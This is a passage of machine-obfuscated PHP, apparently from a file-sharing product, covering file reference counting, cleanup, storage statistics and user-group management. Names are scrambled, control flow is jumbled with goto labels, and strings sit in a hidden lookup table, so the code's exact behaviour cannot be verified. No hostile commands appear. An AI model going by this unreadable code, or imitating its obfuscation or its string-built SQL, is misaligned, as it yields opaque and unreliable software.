$this->addFileData($dóáºÌĞš–); CacheLock::unlock($Bê°Ê…¾¼); goto A¾ÆªÇ„Ù; A¾ÆªÇ„Ù: return $a‚”ÔÁæáƒ; goto A®×œÌ·¶; Aí©´Œšğª: $f…»—·ˆˆº = IO::hashSimple($bÈÏ±±Öâš); $f²£®ÎÅäê = IO::hashMd5($bÈÏ±±Öâš); $B…ÀĞœÑ§ç = IO::size($bÈÏ±±Öâš); goto cË¦ñÄÏö¦; A®×œÌ·¶: } public function addFileMake($a‹À·éÛ, $Bè „²¥‡, $b²§×ŒÅ¦‰, $D‘Å±£„›Ş, $d¢ˆòˆô¯§, $aßÉ·•Îôâ) { goto BÂŠ¬îê¤‘; DˆøñØìÈ¢: $E†¸¤à‡¼œ = get_path_this($bÖàŠÓÂ‚Ù); if ($aßÉ·•Îôâ) { $DÙ¨Œ™¦®ö = IO::move($a‹À·éÛ, $AãİÜ—ææğ, !1, $E†¸¤à‡¼œ); } else { $DÙ¨Œ™¦®ö = IO::copy($a‹À·éÛ, $AãİÜ—ææğ, !1, $E†¸¤à‡¼œ); } if (!$DÙ¨Œ™¦®ö) { return !1; } goto D’øïêø‘; D’øïêø‘: $C¸¿·†¨èÛ = KodIO::defaultDriver(); $bÍÔ˜„‰´´ = array($bçĞàó¬ÊË[543] => $Bè „²¥‡, $bçĞàó¬ÊË[1725] => 1, $bçĞàó¬ÊË[407] => $d¢ˆòˆô¯§, $bçĞàó¬ÊË[754] => $C¸¿·†¨èÛ[$bçĞàó¬ÊË[388]], $bçĞàó¬ÊË[408] => $bÖàŠÓÂ‚Ù, $bçĞàó¬ÊË[1726] => $b²§×ŒÅ¦‰, $bçĞàó¬ÊË[1727] => $D‘Å±£„›Ş); return $bÍÔ˜„‰´´; goto fÅÎ¤ä«å³; BÂŠ¬îê¤‘: $bçĞàó¬ÊË =& $_SERVER[¹Ò‹Ò¹]; $bÖàŠÓÂ‚Ù = $this->createFileName($d¢ˆòˆô¯§, $b²§×ŒÅ¦‰, $D‘Å±£„›Ş); $AãİÜ—ææğ = get_path_father($bÖàŠÓÂ‚Ù); goto DˆøñØìÈ¢; fÅÎ¤ä«å³: } public function addFileCheckExist($AÂ¿”ø‚Ô, $F¶ÈÑø’ç, $BîªˆçÀØŞ) { $f†ëĞèğ×® =& $_SERVER[¹Ò‹Ò¹]; $fÜƒñƒÙ® = $this->findByHash($AÂ¿”ø‚Ô, $F¶ÈÑø’ç); if (!$fÜƒñƒÙ®) { return !1; } $eœÓ©§‰œÏ = array($f†ëĞèğ×®[1725] => intval($fÜƒñƒÙ®[$f†ëĞèğ×®[1729]]) + 1, $f†ëĞèğ×®[543] => $BîªˆçÀØŞ); $this->where(array($f†ëĞèğ×®[442] => $fÜƒñƒÙ®[$f†ëĞèğ×®[441]]))->save($eœÓ©§‰œÏ); return $fÜƒñƒÙ®; } public function remove($dÁ…Š÷ÈØé) { $this->linkCountChange($dÁ…Š÷ÈØé, !1); $this->clearEmpty(); return !0; } public function linkAdd($Aï¾íéÇ…×) { $this->linkCountChange($Aï¾íéÇ…×, !0); } public function linkCountChange($E·‰º™³†˜, $Eö…Ö¤ŠÉî) { goto a¹ŠòÃ„Ş; a¹ŠòÃ„Ş: $B„Ü¢ˆÏ†ù =& $_SERVER[¹Ò‹Ò¹]; if (!$E·‰º™³†˜) { return; } if (!is_array($E·‰º™³†˜)) { $E·‰º™³†˜ = array($E·‰º™³†˜); } goto dßîî–çŒñ; B«¾¨ËàÃ: foreach ($bŸŞê‹ˆ‰‹ as $AªìÈïéÅŸ => $CÛšÏí†ÃÜ) { $c—áÇâç˜ä = $CÛšÏí†ÃÜ . $B„Ü¢ˆÏ†ù[33]; if (!$FÆóó‰µö[$c—áÇâç˜ä]) { $FÆóó‰µö[$c—áÇâç˜ä] = array(); } $FÆóó‰µö[$c—áÇâç˜ä][] = $AªìÈïéÅŸ; } foreach ($FÆóó‰µö as $CÛšÏí†ÃÜ => $d×ïÅÉÎ‡Æ) { if (!$d×ïÅÉÎ‡Æ) { continue; } $CÛšÏí†ÃÜ = $Eö…Ö¤ŠÉî ? $CÛšÏí†ÃÜ : -intval($CÛšÏí†ÃÜ); $aù£Ş‰àñ£ = array($B„Ü¢ˆÏ†ù[441] => array($B„Ü¢ˆÏ†ù[7], $d×ïÅÉÎ‡Æ)); if ($CÛšÏí†ÃÜ < 0) { $aù£Ş‰àñ£[$B„Ü¢ˆÏ†ù[1729]] = array($B„Ü¢ˆÏ†ù[948], abs($CÛšÏí†ÃÜ)); } $this->where($aù£Ş‰àñ£)->setAdd($B„Ü¢ˆÏ†ù[1729], $CÛšÏí†ÃÜ); } goto dœòÌ†˜Ã; dßîî–çŒñ: $bŸŞê‹ˆ‰‹ = array(); foreach ($E·‰º™³†˜ as $AªìÈïéÅŸ) { $c—áÇâç˜ä = $AªìÈïéÅŸ . $B„Ü¢ˆÏ†ù[33]; if (!$bŸŞê‹ˆ‰‹[$c—áÇâç˜ä]) { $bŸŞê‹ˆ‰‹[$c—áÇâç˜ä] = 0; } $bŸŞê‹ˆ‰‹[$c—áÇâç˜ä]++; } $FÆóó‰µö = array(); goto B«¾¨ËàÃ; dœòÌ†˜Ã: } public function findByHash($eó¶Ó‚êªÆ, $CëÅ¡‘æ = false) { $EØœœ˜’ =& $_SERVER[¹Ò‹Ò¹]; if (!$eó¶Ó‚êªÆ && !$CëÅ¡‘æ) { return !1; } $aâŒÖ²ÎÖ  = array($EØœœ˜’[1726] => $eó¶Ó‚êªÆ); if ($CëÅ¡‘æ) { $aâŒÖ²ÎÖ  = array($EØœœ˜’[1727] => $CëÅ¡‘æ); } return $this->order($EØœœ˜’[1730])->where($aâŒÖ²ÎÖ )->find(); } public function clearEmpty($aÌ—èª¦ = 0) { goto Eù•‰”šÃÍ; Bí¢ßöê¢: foreach ($bƒèËåí‡ as $D¼‘Âí¿à) { $eæ‰ì™ìà÷->update(1); $this->resetFile($D¼‘Âí¿à); } $eæ‰ì™ìà÷->end(); goto CÜ¥Š·‡ù; C©–ÈÈ–¢: $bƒèËåí‡ = $this->where($CÆ–ëŸàÔŒ)->select(); if (!$bƒèËåí‡) { return; } $eæ‰ì™ìà÷ = new Task($E©–Ú—çğ[1732], $E©–Ú—çğ[33], count($bƒèËåí‡)); goto Bí¢ßöê¢; Eù•‰”šÃÍ: $E©–Ú—çğ =& $_SERVER[¹Ò‹Ò¹]; $Eèˆ’«Úàõ = time() - 3600 * 24 * $aÌ—èª¦; $CÆ–ëŸàÔŒ = $E©–Ú—çğ[1731] . $Eèˆ’«Úàõ; goto C©–ÈÈ–¢; CÜ¥Š·‡ù: } public function resetFile($Bßİ¹å¯ö´) { goto Fï…æÌÛ á; cÌù¹–¡Î: if ($Bßİ¹å¯ö´[$AÛÓŠ‚Ïó[1729]] != $Fµ‘¤Ê—ïÒ) { $this->where($FˆË¿½Ö­¯)->save(array($AÛÓŠ‚Ïó[1725] => $Fµ‘¤Ê—ïÒ)); } goto eíßœ„ù‚; CÛ†ßäÚÈè: $FåÏç»¸ô = Model($AÛÓŠ‚Ïó[1733])->where($FˆË¿½Ö­¯)->count(); $Fµ‘¤Ê—ïÒ = intval($f˜«ÆÕÅÔñ) + intval($FåÏç»¸ô); if ($Fµ‘¤Ê—ïÒ == 0) { IO::remove($Bßİ¹å¯ö´[$AÛÓŠ‚Ïó[75]]); Model($AÛÓŠ‚Ïó[1734])->delete($Bßİ¹å¯ö´[$AÛÓŠ‚Ïó[441]]); $this->where($FˆË¿½Ö­¯)->delete(); $this->metaSet($Bßİ¹å¯ö´[$AÛÓŠ‚Ïó[441]], null, null); return; } goto cÌù¹–¡Î; Fï…æÌÛ á: $AÛÓŠ‚Ïó =& $_SERVER[¹Ò‹Ò¹]; $FˆË¿½Ö­¯ = array($AÛÓŠ‚Ïó[442] => $Bßİ¹å¯ö´[$AÛÓŠ‚Ïó[441]]); $f˜«ÆÕÅÔñ = Model($AÛÓŠ‚Ïó[1179])->where($FˆË¿½Ö­¯)->count(); goto CÛ†ßäÚÈè; eíßœ„ù‚: } public function storageInfo($a™«œå¹×“ = false) { goto Dèôºğƒ—; B‚©Š ­††: for ($aĞ§ÄÖŞ = 0; $aĞ§ÄÖŞ < $d““Üµ°œÂ; $aĞ§ÄÖŞ = $aĞ§ÄÖŞ + $C›×ê™¢Å) { $b¯Ä…Çß¨ = $this->limit($aĞ§ÄÖŞ, $aĞ§ÄÖŞ + $C›×ê™¢Å)->select(); foreach ($b¯Ä…Çß¨ as $Aì‚„Ö’¼¸) { $A „»±Í“‰ += $Aì‚„Ö’¼¸[$BïœŸôÄÃµ[77]] * $Aì‚„Ö’¼¸[$BïœŸôÄÃµ[1729]]; $Fø‰·ÚîËº += $Aì‚„Ö’¼¸[$BïœŸôÄÃµ[77]] * ($Aì‚„Ö’¼¸[$BïœŸôÄÃµ[1729]] - 1); $FìÕÊè…ëš += $Aì‚„Ö’¼¸[$BïœŸôÄÃµ[1729]]; } } $E¢àÙ…´«‹ = array($BïœŸôÄÃµ[1735] => $A „»±Í“‰, $BïœŸôÄÃµ[1736] => $Fø‰·ÚîËº, $BïœŸôÄÃµ[1737] => $Fø‰·ÚîËº / $A „»±Í“‰, $BïœŸôÄÃµ[81] => $d““Üµ°œÂ, $BïœŸôÄÃµ[1738] => $FìÕÊè…ëš); return $E¢àÙ…´«‹; goto bàÑÇ£…ÖŠ; FŒ…Éá¥Ü: $A „»±Í“‰ = 1; $FìÕÊè…ëš = 0; $C›×ê™¢Å = 5000; goto B‚©Š ­††; Dèôºğƒ—: $BïœŸôÄÃµ =& $_SERVER[¹Ò‹Ò¹]; $d““Üµ°œÂ = $this->count() + 0.0; $Fø‰·ÚîËº = 0; goto FŒ…Éá¥Ü; bàÑÇ£…ÖŠ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\145" => "\x67\x72\x6f\x75\x70\137\x6d\x65\164\141", "\x6d\145\164\x61\x46\151\145\x6c\144" => "\x67\162\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($a¥ñÍ—‘è) { $dî·‰É¼Ì³ =& $_SERVER[¹Ò‹Ò¹]; return array($dî·‰É¼Ì³[1739] => array($a¥ñÍ—‘è[0], $dî·‰É¼Ì³[1740]), $dî·‰É¼Ì³[1741] => array($a¥ñÍ—‘è[0], $dî·‰É¼Ì³[1740])); } protected function getInfo($d­ÙÀš•) { $eñÊøˆ‚Ûª = $this->getInfoSimple($d­ÙÀš•); if (!$eñÊøˆ‚Ûª) { return !1; } return $this->_listDataApplyItem($eñÊøˆ‚Ûª); } protected function getInfoSimple($Fçí‘ƒ‘Õ¾, $E„‚ƒ®§æ“ = false) { $A¿ø…ğ¹Õê =& $_SERVER[¹Ò‹Ò¹]; if ($E„‚ƒ®§æ“) { $FÖ¡†²Š— = array($A¿ø…ğ¹Õê[1667] => intval($Fçí‘ƒ‘Õ¾)); $F“Í„ßÇ» = $this->where($FÖ¡†²Š—)->find(); return is_array($F“Í„ßÇ») ? $F“Í„ßÇ» : array(); } return $this->cacheFunctionGet($A¿ø…ğ¹Õê[1742], $Fçí‘ƒ‘Õ¾); } protected function groupAdd($Cœ¬î¨“Â®) { goto F¨“ÍÏ¤±Æ; cÈî£ÏÈƒÜ: if (isset($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1745]])) { $this->metaSet($F‹ÂÀœ¯³, array($dß–Âğ›¹Ï[1745] => $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1745]], $dß–Âğ›¹Ï[1746] => $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1746]])); unset($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1745]]); unset($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1746]]); } Model($dß–Âğ›¹Ï[1179])->groupRootAdd($F‹ÂÀœ¯³); return $F‹ÂÀœ¯³; goto d”¹É¢°‘ñ; F®‚ÇƒÃ˜ô: if (!empty($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1667]])) { $CšÇÉ ¶”Ğ[$dß–Âğ›¹Ï[1667]] = $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1667]]; } $F‹ÂÀœ¯³ = $this->add($CšÇÉ ¶”Ğ); $this->setNamePinyin($F‹ÂÀœ¯³, $CšÇÉ ¶”Ğ[$dß–Âğ›¹Ï[28]]); goto cÈî£ÏÈƒÜ; FåÃ¿ö”â’: if ($eæÄĞÒÎ ƒ[$dß–Âğ›¹Ï[481]]) { $AğÚ‡ãÆíµ = $eæÄĞÒÎ ƒ[$dß–Âğ›¹Ï[481]] . $eæÄĞÒÎ ƒ[$dß–Âğ›¹Ï[1667]] . $dß–Âğ›¹Ï[47]; } $CšÇÉ ¶”Ğ = array($dß–Âğ›¹Ï[407] => $this->groupNameAuto($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[472]], $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[28]]), $dß–Âğ›¹Ï[389] => $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[472]], $dß–Âğ›¹Ï[548] => $AğÚ‡ãÆíµ, $dß–Âğ›¹Ï[1743] => $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1651]], $dß–Âğ›¹Ï[1744] => 0, $dß–Âğ›¹Ï[1671] => 0); if (isset($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1690]])) { $CšÇÉ ¶”Ğ[$dß–Âğ›¹Ï[1690]] = $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1690]]; } else { $AŠ‡’…ª¥‰ = $this->max($dß–Âğ›¹Ï[1690]); if (!$AŠ‡’…ª¥‰) { $AŠ‡’…ª¥‰ = 0; } $CšÇÉ ¶”Ğ[$dß–Âğ›¹Ï[1690]] = $AŠ‡’…ª¥‰ + 1; } goto F®‚ÇƒÃ˜ô; F¨“ÍÏ¤±Æ: $dß–Âğ›¹Ï =& $_SERVER[¹Ò‹Ò¹]; if (!$Cœ¬î¨“Â®[$dß–Âğ›¹Ï[472]] && isset($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1667]]) && $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1667]] == 1) { if ($eæÄĞÒÎ ƒ = $this->getInfoSimple($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1667]], !0)) { return $Cœ¬î¨“Â®[$dß–Âğ›¹Ï[1667]]; } } else { $eæÄĞÒÎ ƒ = $this->getInfoSimple($Cœ¬î¨“Â®[$dß–Âğ›¹Ï[472]]); if (!$eæÄĞÒÎ ƒ) { return !1; } } $AğÚ‡ãÆíµ = $dß–Âğ›¹Ï[493]; goto FåÃ¿ö”â’; d”¹É¢°‘ñ: } protected function groupEdit($bÃëÄò§°¸, $c»ƒåÚ—Ç) { goto fº‡íóÚ; fº‡íóÚ: $bÛªºÊË°÷ =& $_SERVER[¹Ò‹Ò¹]; $A§Å„œ¨ÖÎ = $this->getInfoSimple($bÃëÄò§°¸); if (!$A§Å„œ¨ÖÎ) { return !1; } goto bÃ£Ä±¸Ì; bÃ£Ä±¸Ì: if (!empty($c»ƒåÚ—Ç[$bÛªºÊË°÷[472]])) { $aùš¿Ü¤Œœ = $this->getInfoSimple($c»ƒåÚ—Ç[$bÛªºÊË°÷[472]]); if (!$aùš¿Ü¤Œœ) { return !1; } if ($A§Å„œ¨ÖÎ[$bÛªºÊË°÷[1667]] == $aùš¿Ü¤Œœ[$bÛªºÊË°÷[1667]]) { return !1; } if ($c»ƒåÚ—Ç[$bÛªºÊË°÷[472]] != $A§Å„œ¨ÖÎ[$bÛªºÊË°÷[472]]) { if ($aùš¿Ü¤Œœ[$bÛªºÊË°÷[481]] !== $A§Å„œ¨ÖÎ[$bÛªºÊË°÷[481]] && strpos($aùš¿Ü¤Œœ[$bÛªºÊË°÷[481]], $A§Å„œ¨ÖÎ[$bÛªºÊË°÷[481]] . $A§Å„œ¨ÖÎ[$bÛªºÊË°÷[1667]] . $bÛªºÊË°÷[47]) === 0) { return !1; } $c»ƒåÚ—Ç[$bÛªºÊË°÷[548]] = $aùš¿Ü¤Œœ[$bÛªºÊË°÷[481]] . $c»ƒåÚ—Ç[$bÛªºÊË°÷[472]] . $bÛªºÊË°÷[47]; $this->_changeChildLevel($A§Å„œ¨ÖÎ, $aùš¿Ü¤Œœ); } } if (isset($c»ƒåÚ—Ç[$bÛªºÊË°÷[28]])) { $this->setNamePinyin($bÃëÄò§°¸, $c»ƒåÚ—Ç[$bÛªºÊË°÷[28]]); } if (isset($c»ƒåÚ—Ç[$bÛªºÊË°÷[1745]])) { $this->metaSet($bÃëÄò§°¸, array($bÛªºÊË°÷[1745] => $c»ƒåÚ—Ç[$bÛªºÊË°÷[1745]], $bÛªºÊË°÷[1746] => $c»ƒåÚ—Ç[$bÛªºÊË°÷[1746]])); unset($c»ƒåÚ—Ç[$bÛªºÊË°÷[1745]]); unset($c»ƒåÚ—Ç[$bÛªºÊË°÷[1746]]); } goto b£äÒ¬ê¶ù; b£äÒ¬ê¶ù: if (isset($c»ƒåÚ—Ç[$bÛªºÊË°÷[28]]) && $c»ƒåÚ—Ç[$bÛªºÊË°÷[28]] != $A§Å„œ¨ÖÎ[$bÛªºÊË°÷[28]]) { $this->_clearChildrenCache($A§Å„œ¨ÖÎ); } return $this->where(array($bÛªºÊË°÷[1747] => $bÃëÄò§°¸))->save($c»ƒåÚ—Ç); goto c•³‘Œë™ñ; c•³‘Œë™ñ: } private function _clearChildrenCache($C‚ï¯ÊÌÓØ) { $FÃÄÈªëˆ =& $_SERVER[¹Ò‹Ò¹]; $Eµ»¼ÖĞİš = array($FÃÄÈªëˆ[548] => array($FÃÄÈªëˆ[507], $C‚ï¯ÊÌÓØ[$FÃÄÈªëˆ[481]] . $C‚ï¯ÊÌÓØ[$FÃÄÈªëˆ[1667]] . $FÃÄÈªëˆ[508])); $eº„ç³Å‹ = $this->field($FÃÄÈªëˆ[1667])->where($Eµ»¼ÖĞİš)->select(); foreach ($eº„ç³Å‹ as $fîíÀĞè) { $this->cacheFunctionClear($FÃÄÈªëˆ[1748], $fîíÀĞè[$FÃÄÈªëˆ[1667]]); $this->cacheFunctionClear($FÃÄÈªëˆ[1742], $fîíÀĞè[$FÃÄÈªëˆ[1667]]); } } private function _changeChildLevel($däÙ¾ÁƒÌ, $a”ÖïòÉ¼Â, $fËî¸³ä„• = false) { goto a™×ë²Ùø; AÕ¢Ì‚—¡: if ($fËî¸³ä„•) { $E›Ì·Ì÷‡µ = $a”ÖïòÉ¼Â[$C£‚™¼•÷[481]] . $a”ÖïòÉ¼Â[$C£‚™¼•÷[1667]] . $C£‚™¼•÷[47]; } $Bƒ«º¶œ…İ = array($C£‚™¼•÷[548] => array($C£‚™¼•÷[507], $däÙ¾ÁƒÌ[$C£‚™¼•÷[481]] . $däÙ¾ÁƒÌ[$C£‚™¼•÷[1667]] . $C£‚™¼•÷[508])); $c±…Á»½Ìœ = array($C£‚™¼•÷[548] => array($C£‚™¼•÷[556], "\162\x65\160\x6c\x61\143\145\x28\160\141\162\145\156\x74\x4c\x65\x76\x65\x6c\54\x27{$AŞ¬ôçéå}\47\54\x27{$E›Ì·Ì÷‡µ}\x27\51")); goto aï…ÁÜ¯£è; a™×ë²Ùø: $C£‚™¼•÷ =& $_SERVER[¹Ò‹Ò¹]; $AŞ¬ôçéå = $däÙ¾ÁƒÌ[$C£‚™¼•÷[481]] . $däÙ¾ÁƒÌ[$C£‚™¼•÷[1667]] . $C£‚™¼•÷[47]; $E›Ì·Ì÷‡µ = $a”ÖïòÉ¼Â[$C£‚™¼•÷[481]] . $a”ÖïòÉ¼Â[$C£‚™¼•÷[1667]] . $C£‚™¼•÷[47] . $däÙ¾ÁƒÌ[$C£‚™¼•÷[1667]] . $C£‚™¼•÷[47]; goto AÕ¢Ì‚—¡; aï…ÁÜ¯£è: $this->_clearChildrenCache($däÙ¾ÁƒÌ); $this->where($Bƒ«º¶œ…İ)->data($c±…Á»½Ìœ)->save(); goto cå“Ã“åÙ‰; cå“Ã“åÙ‰: } public function setNamePinyin($b‘‡¢¼­ç, $CìÏìá½Ê¦ = false) { $BÔ³®ÚÃ›‡ =& $_SERVER[¹Ò‹Ò¹]; if (!$CìÏìá½Ê¦) { $A—‡ò¾ÜÈ = $this->getInfoSimple($b‘‡¢¼­ç); $CìÏìá½Ê¦ = $A—‡ò¾ÜÈ[$BÔ³®ÚÃ›‡[28]]; } if (!Input::check($CìÏìá½Ê¦, $BÔ³®ÚÃ›‡[551])) { $this->metaSet($b‘‡¢¼­ç, $BÔ³®ÚÃ›‡[438], null); $this->metaSet($b‘‡¢¼­ç, $BÔ³®ÚÃ›‡[437], null); return; } $Aâ•œ»˜•… = array($BÔ³®ÚÃ›‡[438] => str_replace($BÔ³®ÚÃ›‡[50], $BÔ³®ÚÃ›‡[33], Pinyin::encode($CìÏìá½Ê¦)), $BÔ³®ÚÃ›‡[437] => Pinyin::encode($CìÏìá½Ê¦, $BÔ³®ÚÃ›‡[552])); $this->metaSet($b‘‡¢¼­ç, $Aâ•œ»˜•…); } protected function groupStatus($d¸ÇìëŸè, $BñïÅÃ–Š ) { goto EÀ—Ş´‰—ï; fÎ—’ã˜· : if ($BñïÅÃ–Š  == $b§¹¼¨„Ï[86]) { $d²á¶®Ïò = $this->parentLevelArray($bíÒÑÅÈÎø[$b§¹¼¨„Ï[481]]); } else { $e¢‹¯ŒÁ‹¨ = array($b§¹¼¨„Ï[548] => array($b§¹¼¨„Ï[507], $bíÒÑÅÈÎø[$b§¹¼¨„Ï[481]] . $bíÒÑÅÈÎø[$b§¹¼¨„Ï[1667]] . $b§¹¼¨„Ï[508])); $d²á¶®Ïò = $this->where($e¢‹¯ŒÁ‹¨)->field($b§¹¼¨„Ï[1667])->select(); $d²á¶®Ïò = array_to_keyvalue($d²á¶®Ïò, $b§¹¼¨„Ï[33], $b§¹¼¨„Ï[1667]); } $d²á¶®Ïò[] = $bíÒÑÅÈÎø[$b§¹¼¨„Ï[1667]]; $b…ŸÎ¦®´Û = array(); goto d¥°æÛ¥Ó; EÀ—Ş´‰—ï: $b§¹¼¨„Ï =& $_SERVER[¹Ò‹Ò¹]; $bíÒÑÅÈÎø = $this->getInfoSimple($d¸ÇìëŸè); if (!$bíÒÑÅÈÎø) { return !1; } goto fÎ—’ã˜· ; d¥°æÛ¥Ó: foreach ($d²á¶®Ïò as $d¸ÇìëŸè) { $b…ŸÎ¦®´Û[] = array($b§¹¼¨„Ï[1667] => $d¸ÇìëŸè, $b§¹¼¨„Ï[92] => $b§¹¼¨„Ï[704], $b§¹¼¨„Ï[370] => $BñïÅÃ–Š ); } return Model($b§¹¼¨„Ï[1749])->addAll($b…ŸÎ¦®´Û, array(), !0); goto c¡ööèê; c¡ööèê: } protected function groupRemove($FÍ–„²´¤Ì) { goto bñà¤á—Š·; bñà¤á—Š·: $Dá«óÉÑî =& $_SERVER[¹Ò‹Ò¹]; $eá‘Èáæ¦ß = array($Dá«óÉÑî[1667] => $FÍ–„²´¤Ì); $EÎ¸Æ…©Ê  = $this->where($eá‘Èáæ¦ß)->find(); goto e»æÖ‚àóŸ; D´¼ŸØáˆ°: $this->where(array($Dá«óÉÑî[472] => $FÍ–„²´¤Ì))->save(array($Dá«óÉÑî[472] => $EÎ¸Æ…©Ê [$Dá«óÉÑî[472]])); Model($Dá«óÉÑî[1749])->where($eá‘Èáæ¦ß)->delete(); Model($Dá«óÉÑî[1750])->where($eá‘Èáæ¦ß)->delete(); goto FÌ¨øñÜ‡‚; e»æÖ‚àóŸ: if (!$EÎ¸Æ…©Ê  || $EÎ¸Æ…©Ê [$Dá«óÉÑî[472]] == 0) { return !1; } $d¿æ¹¿¼Á„ = $this->getInfoSimple($EÎ¸Æ…©Ê [$Dá«óÉÑî[472]]); $this->_changeChildLevel($EÎ¸Æ…©Ê , $d¿æ¹¿¼Á„, !0); goto D´¼ŸØáˆ°; FÌ¨øñÜ‡‚: Model($Dá«óÉÑî[769])->groupRootRemove($FÍ–„²´¤Ì); return $this->where($eá‘Èáæ¦ß)->delete(); goto CÁê‚‚ÀË; CÁê‚‚ÀË: } protected function groupSort($eµ´˜¬ø°Ë) { $Bº’°±õ¾ =& $_SERVER[¹Ò‹Ò¹]; $aÈ¡ÄˆÜ® = array(); foreach ($eµ´˜¬ø°Ë as $a•ÖŒøÜä‡ => $FÏ¯°ï½‡´) { $aÈ¡ÄˆÜ®[] = array($Bº’°±õ¾[1667], $FÏ¯°ï½‡´, $Bº’°±õ¾[1690], $a•ÖŒøÜä‡ + 1); } $this->saveAll($aÈ¡ÄˆÜ®); } public function listData() { $cÙ“´÷¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cÙ“´÷¸[$_SERVER[¹Ò‹Ò¹][365]]); return $cÙ“´÷¸; } private function _makeOrder($Bœù»àÃÕ½ = '') { goto dòôâËë´¢; Cô¬šÚöí‹: $Bœù»àÃÕ½ = $Bœù»àÃÕ½ . "{$DÊÄéÁ›‘õ}\x20{$C½ñ±¨â„Ò}\54\40\x67\x72\x6f\165\160\111\x44\x20\141\x73\x63"; return $this->order($Bœù»àÃÕ½); goto e•§åïÆ“; c‡†¥öÜÖÈ: $DÊÄéÁ›‘õ = Input::get($AÓñ±×Óêë[429], $AÓñ±×Óêë[7], $AÓñ±×Óêë[1671], $b»¾õšù«); $C½ñ±¨â„Ò = Input::get($AÓñ±×Óêë[430], $AÓñ±×Óêë[7], $AÓñ±×Óêë[1751], array($AÓñ±×Óêë[1751], $AÓñ±×Óêë[424])); $C½ñ±¨â„Ò = $F§©¾ç¯Öİ[$C½ñ±¨â„Ò]; goto Cô¬šÚöí‹; dòôâËë´¢: $AÓñ±×Óêë =& $_SERVER[¹Ò‹Ò¹]; $b»¾õšù« = array($AÓñ±×Óêë[1667], $AÓñ±×Óêë[28], $AÓñ±×Óêë[1653], $AÓñ±×Óêë[192]); $F§©¾ç¯Öİ = array($AÓñ±×Óêë[422] => $AÓñ±×Óêë[423], $AÓñ±×Óêë[424] => $AÓñ±×Óêë[425]); goto c‡†¥öÜÖÈ; e•§åïÆ“: } public function listChild($Fğåè¦½Æø) { $FË˜ËÍ±ä‹ =& $_SERVER[¹Ò‹Ò¹]; $c‡«Øùß‚‘ = $this->where(array($FË˜ËÍ±ä‹[472] => $Fğåè¦½Æø))->_makeOrder()->selectPage(200); $this->_listDataApply($c‡«Øùß‚‘[$FË˜ËÍ±ä‹[365]]); return $c‡«Øùß‚‘; } public function listByID($D¸”•®ÜÔš) { $Açà¼ßŒÒ =& $_SERVER[¹Ò‹Ò¹]; if (!$D¸”•®ÜÔš) { return array(); } $D†ñ…‡„ó = array($Açà¼ßŒÒ[1667] => array($Açà¼ßŒÒ[7], $D¸”•®ÜÔš)); $fšˆ—°®¤ = $this->where($D†ñ…‡„ó)->select(); $this->_listDataApply($fšˆ—°®¤); return $fšˆ—°®¤; } public function listSearch($aÚ„£œÖ‰) { goto BÂ«¾œÏ„µ; c¹Ô×à¬ÍÂ: if ($a©„ä±Äá) { $a˜Î—½Æßî = $this->getInfoSimple($a©„ä±Äá); $fïôˆåó– = $a˜Î—½Æßî[$E¡¶ºÑÕ“ù[481]] . $a©„ä±Äá . $E¡¶ºÑÕ“ù[508]; $bº„ñ¿˜› = array($bº„ñ¿˜›, array($E¡¶ºÑÕ“ù[481] => array($E¡¶ºÑÕ“ù[378], $fïôˆåó–))); } $bº„ñ¿˜› = $this->parseWhereLike($bº„ñ¿˜›); $AÒéˆëÏæ˜ = $this->_makeOrder()->where($bº„ñ¿˜›)->selectPage(20); goto Eãí®Ÿ·šß; Eãí®Ÿ·šß: $AÒéˆëÏæ˜ = $AÒéˆëÏæ˜ ? $AÒéˆëÏæ˜ : array($E¡¶ºÑÕ“ù[365] => array(), $E¡¶ºÑÕ“ù[362] => array()); if (!$AÒéˆëÏæ˜ || count($AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[365]]) < 5 && Input::check($FªÖÉÙ‡Ëİ, $E¡¶ºÑÕ“ù[314])) { goto C¥ÏÉ…²ç¦; Aõ¢®Ãêó: $EÚğö¡Ô¤ = array_merge($Bª¿Œªºñ–, $c´÷°â¢™ß, $AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[365]]); $AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[365]] = array_unique_by_key($EÚğö¡Ô¤, $E¡¶ºÑÕ“ù[1667]); $AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[362]][$E¡¶ºÑÕ“ù[363]] = count($AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[365]]); goto CÃ®À„„Ü; C¥ÏÉ…²ç¦: $BìİóêÅé = $this->groupChildrenAll($a©„ä±Äá); $Bª¿Œªºñ– = $this->_searchFromMeta($E¡¶ºÑÕ“ù[437], $FªÖÉÙ‡Ëİ, 10, $BìİóêÅé); $c´÷°â¢™ß = $this->_searchFromMeta($E¡¶ºÑÕ“ù[438], $FªÖÉÙ‡Ëİ, 10, $BìİóêÅé); goto Aõ¢®Ãêó; CÃ®À„„Ü: $AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[362]][$E¡¶ºÑÕ“ù[364]] = ceil($AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[362]][$E¡¶ºÑÕ“ù[363]] / $AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[362]][$E¡¶ºÑÕ“ù[359]]); goto EÏ½šÌÓÅï; EÏ½šÌÓÅï: } $this->_listDataApply($AÒéˆëÏæ˜[$E¡¶ºÑÕ“ù[365]]); goto A…ƒĞÊŞ¶Ø; BÂ«¾œÏ„µ: $E¡¶ºÑÕ“ù =& 